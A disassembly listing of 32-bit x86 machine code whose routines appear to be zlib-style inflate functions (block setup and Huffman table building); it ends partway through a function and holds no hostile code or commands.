  4045ed:	53                   	push   %ebx
  4045ee:	51                   	push   %ecx
  4045ef:	ff 76 3c             	push   0x3c(%esi)
  4045f2:	ff d0                	call   *%eax
  4045f4:	89 46 3c             	mov    %eax,0x3c(%esi)
  4045f7:	83 c4 0c             	add    $0xc,%esp
  4045fa:	89 47 30             	mov    %eax,0x30(%edi)
  4045fd:	85 db                	test   %ebx,%ebx
  4045ff:	74 15                	je     0x404616
  404601:	53                   	push   %ebx
  404602:	ff 75 0c             	push   0xc(%ebp)
  404605:	ff 75 fc             	push   -0x4(%ebp)
  404608:	e8 43 9b 01 00       	call   0x41e150
  40460d:	01 5d fc             	add    %ebx,-0x4(%ebp)
  404610:	83 c4 0c             	add    $0xc,%esp
  404613:	01 5d 0c             	add    %ebx,0xc(%ebp)
  404616:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404619:	89 47 0c             	mov    %eax,0xc(%edi)
  40461c:	8b 45 0c             	mov    0xc(%ebp),%eax
  40461f:	5f                   	pop    %edi
  404620:	89 46 30             	mov    %eax,0x30(%esi)
  404623:	8b 45 10             	mov    0x10(%ebp),%eax
  404626:	5e                   	pop    %esi
  404627:	5b                   	pop    %ebx
  404628:	c9                   	leave
  404629:	c3                   	ret
  40462a:	55                   	push   %ebp
  40462b:	8b ec                	mov    %esp,%ebp
  40462d:	8b 45 18             	mov    0x18(%ebp),%eax
  404630:	6a 1c                	push   $0x1c
  404632:	6a 01                	push   $0x1
  404634:	ff 70 28             	push   0x28(%eax)
  404637:	ff 50 20             	call   *0x20(%eax)
  40463a:	83 c4 0c             	add    $0xc,%esp
  40463d:	85 c0                	test   %eax,%eax
  40463f:	74 1b                	je     0x40465c
  404641:	8a 4d 08             	mov    0x8(%ebp),%cl
  404644:	83 20 00             	andl   $0x0,(%eax)
  404647:	88 48 10             	mov    %cl,0x10(%eax)
  40464a:	8a 4d 0c             	mov    0xc(%ebp),%cl
  40464d:	88 48 11             	mov    %cl,0x11(%eax)
  404650:	8b 4d 10             	mov    0x10(%ebp),%ecx
  404653:	89 48 14             	mov    %ecx,0x14(%eax)
  404656:	8b 4d 14             	mov    0x14(%ebp),%ecx
  404659:	89 48 18             	mov    %ecx,0x18(%eax)
  40465c:	5d                   	pop    %ebp
  40465d:	c3                   	ret
  40465e:	ff 74 24 04          	push   0x4(%esp)
  404662:	8b 44 24 0c          	mov    0xc(%esp),%eax
  404666:	ff 70 28             	push   0x28(%eax)
  404669:	ff 50 24             	call   *0x24(%eax)
  40466c:	59                   	pop    %ecx
  40466d:	59                   	pop    %ecx
  40466e:	c3                   	ret
  40466f:	8b 44 24 0c          	mov    0xc(%esp),%eax
  404673:	53                   	push   %ebx
  404674:	56                   	push   %esi
  404675:	8b 74 24 0c          	mov    0xc(%esp),%esi
  404679:	33 db                	xor    %ebx,%ebx
  40467b:	57                   	push   %edi
  40467c:	3b c3                	cmp    %ebx,%eax
  40467e:	74 05                	je     0x404685
  404680:	8b 4e 3c             	mov    0x3c(%esi),%ecx
  404683:	89 08                	mov    %ecx,(%eax)
  404685:	8b 06                	mov    (%esi),%eax
  404687:	8b 7c 24 14          	mov    0x14(%esp),%edi
  40468b:	83 f8 04             	cmp    $0x4,%eax
  40468e:	74 05                	je     0x404695
  404690:	83 f8 05             	cmp    $0x5,%eax
  404693:	75 0b                	jne    0x4046a0
  404695:	ff 76 0c             	push   0xc(%esi)
  404698:	ff 77 28             	push   0x28(%edi)
  40469b:	ff 57 24             	call   *0x24(%edi)
  40469e:	59                   	pop    %ecx
  40469f:	59                   	pop    %ecx
  4046a0:	83 3e 06             	cmpl   $0x6,(%esi)
  4046a3:	75 0b                	jne    0x4046b0
  4046a5:	57                   	push   %edi
  4046a6:	ff 76 04             	push   0x4(%esi)
  4046a9:	e8 b0 ff ff ff       	call   0x40465e
  4046ae:	59                   	pop    %ecx
  4046af:	59                   	pop    %ecx
  4046b0:	8b 46 28             	mov    0x28(%esi),%eax
  4046b3:	89 46 34             	mov    %eax,0x34(%esi)
  4046b6:	89 46 30             	mov    %eax,0x30(%esi)
  4046b9:	8b 46 38             	mov    0x38(%esi),%eax
  4046bc:	89 1e                	mov    %ebx,(%esi)
  4046be:	89 5e 1c             	mov    %ebx,0x1c(%esi)
  4046c1:	89 5e 20             	mov    %ebx,0x20(%esi)
  4046c4:	3b c3                	cmp    %ebx,%eax
  4046c6:	74 0e                	je     0x4046d6
  4046c8:	53                   	push   %ebx
  4046c9:	53                   	push   %ebx
  4046ca:	53                   	push   %ebx
  4046cb:	ff d0                	call   *%eax
  4046cd:	89 46 3c             	mov    %eax,0x3c(%esi)
  4046d0:	83 c4 0c             	add    $0xc,%esp
  4046d3:	89 47 30             	mov    %eax,0x30(%edi)
  4046d6:	5f                   	pop    %edi
  4046d7:	5e                   	pop    %esi
  4046d8:	5b                   	pop    %ebx
  4046d9:	c3                   	ret
  4046da:	56                   	push   %esi
  4046db:	8b 74 24 08          	mov    0x8(%esp),%esi
  4046df:	57                   	push   %edi
  4046e0:	6a 40                	push   $0x40
  4046e2:	6a 01                	push   $0x1
  4046e4:	ff 76 28             	push   0x28(%esi)
  4046e7:	ff 56 20             	call   *0x20(%esi)
  4046ea:	8b f8                	mov    %eax,%edi
  4046ec:	83 c4 0c             	add    $0xc,%esp
  4046ef:	85 ff                	test   %edi,%edi
  4046f1:	75 04                	jne    0x4046f7
  4046f3:	33 c0                	xor    %eax,%eax
  4046f5:	eb 6f                	jmp    0x404766
  4046f7:	68 a0 05 00 00       	push   $0x5a0
  4046fc:	6a 08                	push   $0x8
  4046fe:	ff 76 28             	push   0x28(%esi)
  404701:	ff 56 20             	call   *0x20(%esi)
  404704:	83 c4 0c             	add    $0xc,%esp
  404707:	89 47 24             	mov    %eax,0x24(%edi)
  40470a:	85 c0                	test   %eax,%eax
  40470c:	75 0b                	jne    0x404719
  40470e:	57                   	push   %edi
  40470f:	ff 76 28             	push   0x28(%esi)
  404712:	ff 56 24             	call   *0x24(%esi)
  404715:	59                   	pop    %ecx
  404716:	59                   	pop    %ecx
  404717:	eb da                	jmp    0x4046f3
  404719:	53                   	push   %ebx
  40471a:	8b 5c 24 18          	mov    0x18(%esp),%ebx
  40471e:	53                   	push   %ebx
  40471f:	6a 01                	push   $0x1
  404721:	ff 76 28             	push   0x28(%esi)
  404724:	ff 56 20             	call   *0x20(%esi)
  404727:	83 c4 0c             	add    $0xc,%esp
  40472a:	89 47 28             	mov    %eax,0x28(%edi)
  40472d:	85 c0                	test   %eax,%eax
  40472f:	75 17                	jne    0x404748
  404731:	ff 77 24             	push   0x24(%edi)
  404734:	ff 76 28             	push   0x28(%esi)
  404737:	ff 56 24             	call   *0x24(%esi)
  40473a:	57                   	push   %edi
  40473b:	ff 76 28             	push   0x28(%esi)
  40473e:	ff 56 24             	call   *0x24(%esi)
  404741:	83 c4 10             	add    $0x10,%esp
  404744:	33 c0                	xor    %eax,%eax
  404746:	eb 1d                	jmp    0x404765
  404748:	83 27 00             	andl   $0x0,(%edi)
  40474b:	03 c3                	add    %ebx,%eax
  40474d:	6a 00                	push   $0x0
  40474f:	89 47 2c             	mov    %eax,0x2c(%edi)
  404752:	8b 44 24 18          	mov    0x18(%esp),%eax
  404756:	56                   	push   %esi
  404757:	57                   	push   %edi
  404758:	89 47 38             	mov    %eax,0x38(%edi)
  40475b:	e8 0f ff ff ff       	call   0x40466f
  404760:	83 c4 0c             	add    $0xc,%esp
  404763:	8b c7                	mov    %edi,%eax
  404765:	5b                   	pop    %ebx
  404766:	5f                   	pop    %edi
  404767:	5e                   	pop    %esi
  404768:	c3                   	ret
  404769:	56                   	push   %esi
  40476a:	8b 74 24 0c          	mov    0xc(%esp),%esi
  40476e:	57                   	push   %edi
  40476f:	8b 7c 24 0c          	mov    0xc(%esp),%edi
  404773:	6a 00                	push   $0x0
  404775:	56                   	push   %esi
  404776:	57                   	push   %edi
  404777:	e8 f3 fe ff ff       	call   0x40466f
  40477c:	ff 77 28             	push   0x28(%edi)
  40477f:	ff 76 28             	push   0x28(%esi)
  404782:	ff 56 24             	call   *0x24(%esi)
  404785:	ff 77 24             	push   0x24(%edi)
  404788:	ff 76 28             	push   0x28(%esi)
  40478b:	ff 56 24             	call   *0x24(%esi)
  40478e:	57                   	push   %edi
  40478f:	ff 76 28             	push   0x28(%esi)
  404792:	ff 56 24             	call   *0x24(%esi)
  404795:	83 c4 24             	add    $0x24,%esp
  404798:	5f                   	pop    %edi
  404799:	33 c0                	xor    %eax,%eax
  40479b:	5e                   	pop    %esi
  40479c:	c3                   	ret
  40479d:	55                   	push   %ebp
  40479e:	8d 6c 24 b0          	lea    -0x50(%esp),%ebp
  4047a2:	81 ec 0c 01 00 00    	sub    $0x10c,%esp
  4047a8:	a1 a0 06 44 00       	mov    0x4406a0,%eax
  4047ad:	33 c5                	xor    %ebp,%eax
  4047af:	89 45 4c             	mov    %eax,0x4c(%ebp)
  4047b2:	8b 4d 58             	mov    0x58(%ebp),%ecx
  4047b5:	8b 55 6c             	mov    0x6c(%ebp),%edx
  4047b8:	8b 45 70             	mov    0x70(%ebp),%eax
  4047bb:	53                   	push   %ebx
  4047bc:	33 db                	xor    %ebx,%ebx
  4047be:	56                   	push   %esi
  4047bf:	8b 75 5c             	mov    0x5c(%ebp),%esi
  4047c2:	57                   	push   %edi
  4047c3:	8b 7d 74             	mov    0x74(%ebp),%edi
  4047c6:	89 7d 80             	mov    %edi,-0x80(%ebp)
  4047c9:	8b 7d 78             	mov    0x78(%ebp),%edi
  4047cc:	89 7d 8c             	mov    %edi,-0x74(%ebp)
  4047cf:	8b 7d 7c             	mov    0x7c(%ebp),%edi
  4047d2:	89 7d 94             	mov    %edi,-0x6c(%ebp)
  4047d5:	89 4d b8             	mov    %ecx,-0x48(%ebp)
  4047d8:	89 75 90             	mov    %esi,-0x70(%ebp)
  4047db:	89 55 84             	mov    %edx,-0x7c(%ebp)
  4047de:	89 5d 0c             	mov    %ebx,0xc(%ebp)
  4047e1:	89 5d 10             	mov    %ebx,0x10(%ebp)
  4047e4:	89 5d 14             	mov    %ebx,0x14(%ebp)
  4047e7:	89 5d 18             	mov    %ebx,0x18(%ebp)
  4047ea:	89 5d 1c             	mov    %ebx,0x1c(%ebp)
  4047ed:	89 5d 20             	mov    %ebx,0x20(%ebp)
  4047f0:	89 5d 24             	mov    %ebx,0x24(%ebp)
  4047f3:	89 5d 28             	mov    %ebx,0x28(%ebp)
  4047f6:	89 5d 2c             	mov    %ebx,0x2c(%ebp)
  4047f9:	89 5d 30             	mov    %ebx,0x30(%ebp)
  4047fc:	89 5d 34             	mov    %ebx,0x34(%ebp)
  4047ff:	89 5d 38             	mov    %ebx,0x38(%ebp)
  404802:	89 5d 3c             	mov    %ebx,0x3c(%ebp)
  404805:	89 5d 40             	mov    %ebx,0x40(%ebp)
  404808:	89 5d 44             	mov    %ebx,0x44(%ebp)
  40480b:	89 5d 48             	mov    %ebx,0x48(%ebp)
  40480e:	8b f9                	mov    %ecx,%edi
  404810:	89 75 c0             	mov    %esi,-0x40(%ebp)
  404813:	8b 0f                	mov    (%edi),%ecx
  404815:	8d 4c 8d 0c          	lea    0xc(%ebp,%ecx,4),%ecx
  404819:	ff 01                	incl   (%ecx)
  40481b:	83 c7 04             	add    $0x4,%edi
  40481e:	ff 4d c0             	decl   -0x40(%ebp)
  404821:	75 f0                	jne    0x404813
  404823:	39 75 0c             	cmp    %esi,0xc(%ebp)
  404826:	75 18                	jne    0x404840
  404828:	89 1a                	mov    %ebx,(%edx)
  40482a:	89 18                	mov    %ebx,(%eax)
  40482c:	33 c0                	xor    %eax,%eax
  40482e:	8b 4d 4c             	mov    0x4c(%ebp),%ecx
  404831:	5f                   	pop    %edi
  404832:	5e                   	pop    %esi
  404833:	33 cd                	xor    %ebp,%ecx
  404835:	5b                   	pop    %ebx
  404836:	e8 ff 97 01 00       	call   0x41e03a
  40483b:	83 c5 50             	add    $0x50,%ebp
  40483e:	c9                   	leave
  40483f:	c3                   	ret
  404840:	8b 38                	mov    (%eax),%edi
  404842:	33 f6                	xor    %esi,%esi
  404844:	46                   	inc    %esi
  404845:	6a 0f                	push   $0xf
  404847:	89 7d c4             	mov    %edi,-0x3c(%ebp)
  40484a:	8b ce                	mov    %esi,%ecx
  40484c:	5a                   	pop    %edx
  40484d:	39 5c 8d 0c          	cmp    %ebx,0xc(%ebp,%ecx,4)
  404851:	75 05                	jne    0x404858
  404853:	41                   	inc    %ecx
  404854:	3b ca                	cmp    %edx,%ecx
  404856:	76 f5                	jbe    0x40484d
  404858:	89 4d c8             	mov    %ecx,-0x38(%ebp)
  40485b:	3b f9                	cmp    %ecx,%edi
  40485d:	73 03                	jae    0x404862
  40485f:	89 4d c4             	mov    %ecx,-0x3c(%ebp)
  404862:	39 5c 95 0c          	cmp    %ebx,0xc(%ebp,%edx,4)
  404866:	75 03                	jne    0x40486b
  404868:	4a                   	dec    %edx
  404869:	75 f7                	jne    0x404862
  40486b:	89 55 a8             	mov    %edx,-0x58(%ebp)
  40486e:	39 55 c4             	cmp    %edx,-0x3c(%ebp)
  404871:	76 03                	jbe    0x404876
  404873:	89 55 c4             	mov    %edx,-0x3c(%ebp)
  404876:	8b 7d c4             	mov    -0x3c(%ebp),%edi
  404879:	89 38                	mov    %edi,(%eax)
  40487b:	d3 e6                	shl    %cl,%esi
  40487d:	eb 0d                	jmp    0x40488c
  40487f:	2b 74 8d 0c          	sub    0xc(%ebp,%ecx,4),%esi
  404883:	0f 88 06 01 00 00    	js     0x40498f
  404889:	41                   	inc    %ecx
  40488a:	03 f6                	add    %esi,%esi
  40488c:	3b ca                	cmp    %edx,%ecx
  40488e:	72 ef                	jb     0x40487f
  404890:	8b fa                	mov    %edx,%edi
  404892:	8d 44 bd 0c          	lea    0xc(%ebp,%edi,4),%eax
  404896:	8b 08                	mov    (%eax),%ecx
  404898:	2b f1                	sub    %ecx,%esi
  40489a:	89 75 88             	mov    %esi,-0x78(%ebp)
  40489d:	0f 88 ec 00 00 00    	js     0x40498f
  4048a3:	03 ce                	add    %esi,%ecx
  4048a5:	89 08                	mov    %ecx,(%eax)
  4048a7:	33 c0                	xor    %eax,%eax
  4048a9:	4a                   	dec    %edx
  4048aa:	89 5d d0             	mov    %ebx,-0x30(%ebp)
  4048ad:	74 10                	je     0x4048bf
  4048af:	33 c9                	xor    %ecx,%ecx
  4048b1:	03 44 0d 10          	add    0x10(%ebp,%ecx,1),%eax
  4048b5:	83 c1 04             	add    $0x4,%ecx
  4048b8:	4a                   	dec    %edx
  4048b9:	89 44 0d d0          	mov    %eax,-0x30(%ebp,%ecx,1)
  4048bd:	75 f2                	jne    0x4048b1
  4048bf:	8b 4d b8             	mov    -0x48(%ebp),%ecx
  4048c2:	33 d2                	xor    %edx,%edx
  4048c4:	8b 01                	mov    (%ecx),%eax
  4048c6:	83 c1 04             	add    $0x4,%ecx
  4048c9:	89 4d b4             	mov    %ecx,-0x4c(%ebp)
  4048cc:	3b c3                	cmp    %ebx,%eax
  4048ce:	74 15                	je     0x4048e5
  4048d0:	8b 75 94             	mov    -0x6c(%ebp),%esi
  4048d3:	8d 44 85 cc          	lea    -0x34(%ebp,%eax,4),%eax
  4048d7:	8b 08                	mov    (%eax),%ecx
  4048d9:	89 14 8e             	mov    %edx,(%esi,%ecx,4)
  4048dc:	8b 75 88             	mov    -0x78(%ebp),%esi
  4048df:	41                   	inc    %ecx
  4048e0:	89 08                	mov    %ecx,(%eax)
  4048e2:	8b 4d b4             	mov    -0x4c(%ebp),%ecx
  4048e5:	42                   	inc    %edx
  4048e6:	3b 55 90             	cmp    -0x70(%ebp),%edx
  4048e9:	72 d9                	jb     0x4048c4
  4048eb:	8b 44 bd cc          	mov    -0x34(%ebp,%edi,4),%eax
  4048ef:	8b 55 c4             	mov    -0x3c(%ebp),%edx
  4048f2:	83 4d b0 ff          	orl    $0xffffffff,-0x50(%ebp)
  4048f6:	89 45 90             	mov    %eax,-0x70(%ebp)
  4048f9:	8b 45 94             	mov    -0x6c(%ebp),%eax
  4048fc:	89 45 b4             	mov    %eax,-0x4c(%ebp)
  4048ff:	8b 45 c8             	mov    -0x38(%ebp),%eax
  404902:	f7 da                	neg    %edx
  404904:	89 5d c0             	mov    %ebx,-0x40(%ebp)
  404907:	89 5d cc             	mov    %ebx,-0x34(%ebp)
  40490a:	89 9d 44 ff ff ff    	mov    %ebx,-0xbc(%ebp)
  404910:	89 5d ac             	mov    %ebx,-0x54(%ebp)
  404913:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  404916:	3b 45 a8             	cmp    -0x58(%ebp),%eax
  404919:	0f 8f fa 01 00 00    	jg     0x404b19
  40491f:	8b 7d 9c             	mov    -0x64(%ebp),%edi
  404922:	8d 44 85 0c          	lea    0xc(%ebp,%eax,4),%eax
  404926:	89 45 a0             	mov    %eax,-0x60(%ebp)
  404929:	8b 45 a0             	mov    -0x60(%ebp),%eax
  40492c:	8b 00                	mov    (%eax),%eax
  40492e:	89 45 a4             	mov    %eax,-0x5c(%ebp)
  404931:	3b c3                	cmp    %ebx,%eax
  404933:	0f 84 cd 01 00 00    	je     0x404b06
  404939:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  40493c:	ff 4d a4             	decl   -0x5c(%ebp)
  40493f:	8d 34 02             	lea    (%edx,%eax,1),%esi
  404942:	39 75 c8             	cmp    %esi,-0x38(%ebp)
  404945:	0f 8e e1 00 00 00    	jle    0x404a2c
  40494b:	2b d0                	sub    %eax,%edx
  40494d:	89 55 b8             	mov    %edx,-0x48(%ebp)
  404950:	8b 4d c4             	mov    -0x3c(%ebp),%ecx
  404953:	8b 45 a8             	mov    -0x58(%ebp),%eax
  404956:	ff 45 b0             	incl   -0x50(%ebp)
  404959:	01 4d b8             	add    %ecx,-0x48(%ebp)
  40495c:	8b d6                	mov    %esi,%edx
  40495e:	2b c2                	sub    %edx,%eax
  404960:	89 45 bc             	mov    %eax,-0x44(%ebp)
  404963:	3b c1                	cmp    %ecx,%eax
  404965:	76 03                	jbe    0x40496a
  404967:	89 4d bc             	mov    %ecx,-0x44(%ebp)
  40496a:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  40496d:	8b 5d a4             	mov    -0x5c(%ebp),%ebx
  404970:	33 c0                	xor    %eax,%eax
  404972:	2b ca                	sub    %edx,%ecx
  404974:	40                   	inc    %eax
  404975:	d3 e0                	shl    %cl,%eax
  404977:	8d 73 01             	lea    0x1(%ebx),%esi
  40497a:	3b c6                	cmp    %esi,%eax
  40497c:	76 2c                	jbe    0x4049aa
  40497e:	83 ce ff             	or     $0xffffffff,%esi
  404981:	2b f3                	sub    %ebx,%esi
  404983:	8b 5d a0             	mov    -0x60(%ebp),%ebx
  404986:	03 c6                	add    %esi,%eax
  404988:	3b 4d bc             	cmp    -0x44(%ebp),%ecx
  40498b:	73 1d                	jae    0x4049aa
  40498d:	eb 15                	jmp    0x4049a4
  40498f:	6a fd                	push   $0xfffffffd
  404991:	58                   	pop    %eax
  404992:	e9 97 fe ff ff       	jmp    0x40482e
  404997:	83 c3 04             	add    $0x4,%ebx
  40499a:	8b 33                	mov    (%ebx),%esi
  40499c:	03 c0                	add    %eax,%eax
  40499e:	3b c6                	cmp    %esi,%eax
  4049a0:	76 08                	jbe    0x4049aa
  4049a2:	2b c6                	sub    %esi,%eax
  4049a4:	41                   	inc    %ecx
  4049a5:	3b 4d bc             	cmp    -0x44(%ebp),%ecx
  4049a8:	72 ed                	jb     0x404997
  4049aa:	8b 45 8c             	mov    -0x74(%ebp),%eax
  4049ad:	8b 00                	mov    (%eax),%eax
  4049af:	33 f6                	xor    %esi,%esi
  4049b1:	46                   	inc    %esi
  4049b2:	d3 e6                	shl    %cl,%esi
  4049b4:	8d 1c 30             	lea    (%eax,%esi,1),%ebx
  4049b7:	89 75 bc             	mov    %esi,-0x44(%ebp)
  4049ba:	81 fb a0 05 00 00    	cmp    $0x5a0,%ebx
  4049c0:	77 cd                	ja     0x40498f
  4049c2:	8b 75 80             	mov    -0x80(%ebp),%esi
  4049c5:	8d 04 c6             	lea    (%esi,%eax,8),%eax
  4049c8:	8b 75 b0             	mov    -0x50(%ebp),%esi
  4049cb:	8d b4 b5 44 ff ff ff 	lea    -0xbc(%ebp,%esi,4),%esi
  4049d2:	89 45 ac             	mov    %eax,-0x54(%ebp)
  4049d5:	89 06                	mov    %eax,(%esi)
  4049d7:	8b 45 8c             	mov    -0x74(%ebp),%eax
  4049da:	89 18                	mov    %ebx,(%eax)
  4049dc:	8b 45 b0             	mov    -0x50(%ebp),%eax
  4049df:	33 db                	xor    %ebx,%ebx
  4049e1:	3b c3                	cmp    %ebx,%eax
  4049e3:	74 30                	je     0x404a15
  4049e5:	8b 7d c0             	mov    -0x40(%ebp),%edi
  4049e8:	89 7c 85 cc          	mov    %edi,-0x34(%ebp,%eax,4)
  4049ec:	8a 45 c4             	mov    -0x3c(%ebp),%al
  4049ef:	88 45 99             	mov    %al,-0x67(%ebp)
  4049f2:	8b c7                	mov    %edi,%eax
  4049f4:	8b 7d ac             	mov    -0x54(%ebp),%edi
  4049f7:	88 4d 98             	mov    %cl,-0x68(%ebp)
  4049fa:	8b 4d b8             	mov    -0x48(%ebp),%ecx
  4049fd:	d3 e8                	shr    %cl,%eax
  4049ff:	8b 4e fc             	mov    -0x4(%esi),%ecx
  404a02:	8b 75 98             	mov    -0x68(%ebp),%esi
  404a05:	2b f9                	sub    %ecx,%edi
  404a07:	c1 ff 03             	sar    $0x3,%edi
  404a0a:	2b f8                	sub    %eax,%edi
  404a0c:	89 34 c1             	mov    %esi,(%ecx,%eax,8)
  404a0f:	89 7c c1 04          	mov    %edi,0x4(%ecx,%eax,8)
  404a13:	eb 08                	jmp    0x404a1d
  404a15:	8b 45 84             	mov    -0x7c(%ebp),%eax
  404a18:	8b 4d ac             	mov    -0x54(%ebp),%ecx
  404a1b:	89 08                	mov    %ecx,(%eax)
  404a1d:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  404a20:	8d 34 02             	lea    (%edx,%eax,1),%esi
  404a23:	39 75 c8             	cmp    %esi,-0x38(%ebp)
  404a26:	0f 8f 24 ff ff ff    	jg     0x404950
  404a2c:	8a 45 c8             	mov    -0x38(%ebp),%al
  404a2f:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  404a32:	2a c2                	sub    %dl,%al
  404a34:	88 45 99             	mov    %al,-0x67(%ebp)
  404a37:	8b 45 94             	mov    -0x6c(%ebp),%eax
  404a3a:	8d 0c 88             	lea    (%eax,%ecx,4),%ecx
  404a3d:	8b 45 b4             	mov    -0x4c(%ebp),%eax
  404a40:	3b c1                	cmp    %ecx,%eax
  404a42:	72 06                	jb     0x404a4a
  404a44:	c6 45 98 c0          	movb   $0xc0,-0x68(%ebp)
  404a48:	eb 34                	jmp    0x404a7e
  404a4a:	8b 00                	mov    (%eax),%eax
  404a4c:	3b 45 60             	cmp    0x60(%ebp),%eax
  404a4f:	73 14                	jae    0x404a65
  404a51:	3d 00 01 00 00       	cmp    $0x100,%eax
  404a56:	0f 92 c1             	setb   %cl
  404a59:	fe c9                	dec    %cl
  404a5b:	80 e1 60             	and    $0x60,%cl
  404a5e:	88 4d 98             	mov    %cl,-0x68(%ebp)
  404a61:	8b f8                	mov    %eax,%edi
  404a63:	eb 15                	jmp    0x404a7a
  404a65:	2b 45 60             	sub    0x60(%ebp),%eax
  404a68:	8b 4d 68             	mov    0x68(%ebp),%ecx
  404a6b:	8a 0c 81             	mov    (%ecx,%eax,4),%cl
  404a6e:	80 c1 50             	add    $0x50,%cl
  404a71:	88 4d 98             	mov    %cl,-0x68(%ebp)
  404a74:	8b 4d 64             	mov    0x64(%ebp),%ecx
  404a77:	8b 3c 81             	mov    (%ecx,%eax,4),%edi
  404a7a:	83 45 b4 04          	addl   $0x4,-0x4c(%ebp)
  404a7e:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  404a81:	8b 45 c0             	mov    -0x40(%ebp),%eax
  404a84:	33 f6                	xor    %esi,%esi
  404a86:	2b ca                	sub    %edx,%ecx
  404a88:	46                   	inc    %esi
  404a89:	d3 e6                	shl    %cl,%esi
  404a8b:	8b ca                	mov    %edx,%ecx
  404a8d:	d3 e8                	shr    %cl,%eax
  404a8f:	3b 45 bc             	cmp    -0x44(%ebp),%eax
  404a92:	73 1e                	jae    0x404ab2
  404a94:	8b 4d ac             	mov    -0x54(%ebp),%ecx
  404a97:	8d 0c c1             	lea    (%ecx,%eax,8),%ecx
  404a9a:	8b 5d 98             	mov    -0x68(%ebp),%ebx
  404a9d:	89 19                	mov    %ebx,(%ecx)
  404a9f:	8b de                	mov    %esi,%ebx
  404aa1:	c1 e3 03             	shl    $0x3,%ebx
  404aa4:	89 79 04             	mov    %edi,0x4(%ecx)
  404aa7:	03 c6                	add    %esi,%eax
  404aa9:	03 cb                	add    %ebx,%ecx
  404aab:	3b 45 bc             	cmp    -0x44(%ebp),%eax
  404aae:	72 ea                	jb     0x404a9a
  404ab0:	33 db                	xor    %ebx,%ebx
  404ab2:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  404ab5:	8b 75 c0             	mov    -0x40(%ebp),%esi
  404ab8:	33 c0                	xor    %eax,%eax
  404aba:	49                   	dec    %ecx
  404abb:	40                   	inc    %eax
  404abc:	d3 e0                	shl    %cl,%eax
  404abe:	eb 04                	jmp    0x404ac4
  404ac0:	33 f0                	xor    %eax,%esi
  404ac2:	d1 e8                	shr    $1,%eax
  404ac4:	85 c6                	test   %eax,%esi
  404ac6:	75 f8                	jne    0x404ac0
  404ac8:	33 f0                	xor    %eax,%esi
  404aca:	33 c0                	xor    %eax,%eax
  404acc:	40                   	inc    %eax
  404acd:	8b ca                	mov    %edx,%ecx
  404acf:	d3 e0                	shl    %cl,%eax
  404ad1:	89 75 c0             	mov    %esi,-0x40(%ebp)
  404ad4:	48                   	dec    %eax
  404ad5:	23 c6                	and    %esi,%eax
  404ad7:	8b c8                	mov    %eax,%ecx
  404ad9:	8b 45 b0             	mov    -0x50(%ebp),%eax
  404adc:	3b 4c 85 cc          	cmp    -0x34(%ebp,%eax,4),%ecx
  404ae0:	74 18                	je     0x404afa
  404ae2:	2b 55 c4             	sub    -0x3c(%ebp),%edx
  404ae5:	33 f6                	xor    %esi,%esi
  404ae7:	46                   	inc    %esi
  404ae8:	8b ca                	mov    %edx,%ecx
  404aea:	d3 e6                	shl    %cl,%esi
  404aec:	48                   	dec    %eax
  404aed:	4e                   	dec    %esi
  404aee:	23 75 c0             	and    -0x40(%ebp),%esi
  404af1:	3b 74 85 cc          	cmp    -0x34(%ebp,%eax,4),%esi
  404af5:	75 eb                	jne    0x404ae2
  404af7:	89 45 b0             	mov    %eax,-0x50(%ebp)
  404afa:	39 5d a4             	cmp    %ebx,-0x5c(%ebp)
  404afd:	0f 85 36 fe ff ff    	jne    0x404939
  404b03:	8b 75 88             	mov    -0x78(%ebp),%esi
  404b06:	ff 45 c8             	incl   -0x38(%ebp)
  404b09:	8b 45 c8             	mov    -0x38(%ebp),%eax
  404b0c:	83 45 a0 04          	addl   $0x4,-0x60(%ebp)
  404b10:	3b 45 a8             	cmp    -0x58(%ebp),%eax
  404b13:	0f 8e 10 fe ff ff    	jle    0x404929
  404b19:	3b f3                	cmp    %ebx,%esi
  404b1b:	0f 84 0b fd ff ff    	je     0x40482c
  404b21:	83 7d a8 01          	cmpl   $0x1,-0x58(%ebp)
  404b25:	0f 84 01 fd ff ff    	je     0x40482c
  404b2b:	6a fb                	push   $0xfffffffb
  404b2d:	e9 5f fe ff ff       	jmp    0x404991
  404b32:	55                   	push   %ebp
  404b33:	8b ec                	mov    %esp,%ebp
  404b35:	51                   	push   %ecx
  404b36:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  404b3a:	56                   	push   %esi
  404b3b:	8b 75 18             	mov    0x18(%ebp),%esi
  404b3e:	6a 04                	push   $0x4
  404b40:	6a 13                	push   $0x13
  404b42:	ff 76 28             	push   0x28(%esi)
  404b45:	ff 56 20             	call   *0x20(%esi)
  404b48:	83 c4 0c             	add    $0xc,%esp
  404b4b:	89 45 18             	mov    %eax,0x18(%ebp)
  404b4e:	85 c0                	test   %eax,%eax
  404b50:	75 05                	jne    0x404b57
  404b52:	6a fc                	push   $0xfffffffc
  404b54:	58                   	pop    %eax
  404b55:	eb 57                	jmp    0x404bae
  404b57:	53                   	push   %ebx
  404b58:	50                   	push   %eax
  404b59:	8d 45 fc             	lea    -0x4(%ebp),%eax
  404b5c:	50                   	push   %eax
  404b5d:	ff 75 14             	push   0x14(%ebp)
  404b60:	ff 75 0c             	push   0xc(%ebp)
  404b63:	ff 75 10             	push   0x10(%ebp)
  404b66:	6a 00                	push   $0x0
  404b68:	6a 00                	push   $0x0
  404b6a:	6a 13                	push   $0x13
  404b6c:	6a 13                	push   $0x13
  404b6e:	ff 75 08             	push   0x8(%ebp)
  404b71:	e8 27 fc ff ff       	call   0x40479d
  404b76:	8b d8                	mov    %eax,%ebx
  404b78:	83 c4 28             	add    $0x28,%esp
  404b7b:	83 fb fd             	cmp    $0xfffffffd,%ebx
  404b7e:	75 09                	jne    0x404b89
  404b80:	c7 46 18 ac 82 43 00 	movl   $0x4382ac,0x18(%esi)
  404b87:	eb 17                	jmp    0x404ba0
  404b89:	83 fb fb             	cmp    $0xfffffffb,%ebx
  404b8c:	74 08                	je     0x404b96
  404b8e:	8b 45 0c             	mov    0xc(%ebp),%eax
  404b91:	83 38 00             	cmpl   $0x0,(%eax)
  404b94:	75 0a                	jne    0x404ba0
  404b96:	6a fd                	push   $0xfffffffd
  404b98:	c7 46 18 88 82 43 00 	movl   $0x438288,0x18(%esi)
  404b9f:	5b                   	pop    %ebx
